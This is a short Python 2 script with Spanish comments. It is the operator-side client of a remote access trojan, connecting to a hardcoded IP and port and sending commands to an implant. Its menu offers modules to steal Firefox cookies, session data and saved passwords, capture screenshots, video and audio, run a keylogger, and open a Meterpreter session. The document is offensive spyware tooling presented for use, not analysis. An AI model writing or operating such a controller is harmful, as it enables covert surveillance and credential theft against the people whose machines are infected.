#!/usr/bin/python
 
#importamos el modulo para trabajar con sockets
import socket, sys 
 
#Creamos un objeto socket para el servidor. Podemos dejarlo sin parametros pero si 
#quieren pueden pasarlos de la manera server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = socket.socket()
 
#Nos conectamos al servidor con el metodo connect. Tiene dos parametros
#El primero es la IP del servidor y el segundo el puerto de conexion
try :
    s.connect(("192.168.63.179", 6666))
except :
    print 'No se puede realizar la conexion'
    sys.exit()
 
print "----------------Menu---------------------------------------------------------------------------------------------------" 
print "Escribir el comando para realizar la accion descrita"
print "a)cookies =  Modulo de obtencion de cookies y variables de sesion del explorador Mozilla Firefox."
print "b) captura t tiempo_segundos = Realiza 5 capturas de pantalla en el intervalo de tiempo dado."
print "b2) captura n numero_capturas = Realiza el numero de capturas de pantalla indicadas en el instante."
print "c) captvid tiempo_segundos= Modulo para captura de video."
print "d) captaud tiempo_segundos= Modulo para captura de audio."
print "e) contrasenas = Modulo de obtencion de contrasenas almacenadas en el  explorador Mozilla Firefox"
print "f) keylogger tiempo_segundos = Modulo del keylloger, especificar el tiempo en segundos en que se va ejecutar el keylogger"
print "g) meterpreter = Modulo de sesion de meterpreter."
print "-------------------------------------------------------------------------------------------------------------------------" 
#Creamos un bucle para retener la conexion
while True:
    #Instanciamos una entrada de datos para que el cliente pueda enviar mensajes
    mensaje = raw_input("comando>> ")
 
    #Con la instancia del objeto servidor (s) y el metodo send, enviamos el mensaje introducido
    s.send(mensaje)
    
    #Si por alguna razon el mensaje es close cerramos la conexion
    if mensaje == "close":
        break

    #sc, addr = s.accept()
    recibido = s.recv(1024);
    if recibido != "":
        print recibido 
 
#Imprimimos la palabra Adios para cuando se cierre la conexion
print "Adios."
 
#Cerramos la instancia del objeto servidor
s.close()

